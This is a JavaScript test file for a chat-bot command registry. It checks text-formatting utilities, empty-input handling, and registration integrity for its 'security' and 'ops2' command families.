  assert.match(String((await run(reg, 'tcomma', '1234567')).text), /1,234,567/);
  assert.match(String((await run(reg, 'tordinalise', '1 2 3 4 11 21 22')).text), /1st 2nd 3rd 4th 11th 21st 22nd/);
  assert.match(String((await run(reg, 'tnoaccent', 'café')).text), /^cafe$/m);
});

test('text utilities reject empty input rather than returning nothing', async () => {
  const reg = build();
  const names = reg.list({ family: 'ops2' })
    .map((c) => c.name)
    .filter((n) => /^t[a-z]+$/.test(n));
  for (const name of names) {
    const res = await run(reg, name, '');
    assert.ok(res.error, `${name} returned success for empty input`);
  }
});

/* ── registration integrity ─────────────────────────────────────────── */

test('both new families register with real effect strings', () => {
  const reg = build();
  for (const family of ['security', 'ops2']) {
    const cmds = reg.list({ family });
    assert.ok(cmds.length >= 100, `${family} should be substantial, got ${cmds.length}`);
    for (const c of cmds) {
      assert.ok(c.effect.trim().length > 8, `${c.name} has a weak effect string`);
      assert.ok(c.summary.trim().length > 2, `${c.name} has no summary`);
    }
  }
});

test('no two commands in either new family declare the same effect', () => {
  const reg = build();
  for (const family of ['security', 'ops2']) {
    const seen = new Map();
    for (const c of reg.list({ family })) {
      const key = c.effect.trim().toLowerCase();
      const prior = seen.get(key);
      assert.ok(!prior, `${family}: ${c.name} declares the same effect as ${prior}`);
      seen.set(key, c.name);
    }
  }
});

test('every security and ops2 command runs without throwing on empty input', async () => {
  const reg = build();
  const failures = [];
  for (const family of ['security', 'ops2']) {
    for (const c of reg.list({ family })) {
      const res = await reg.run(sock, 'g1@g.us', c.name, '', { sender: 'u@s', state: new Map() });
      // Either a clean result or a clean error. Never a thrown exception, and
      // never an empty response.
      if (!res.text && !res.error) failures.push(`${c.name} returned neither text nor error`);
      if (res.error && /undefined is not|Cannot read/.test(res.error)) failures.push(`${c.name}: ${res.error}`);
    }
  }
  assert.deepEqual(failures, []);
});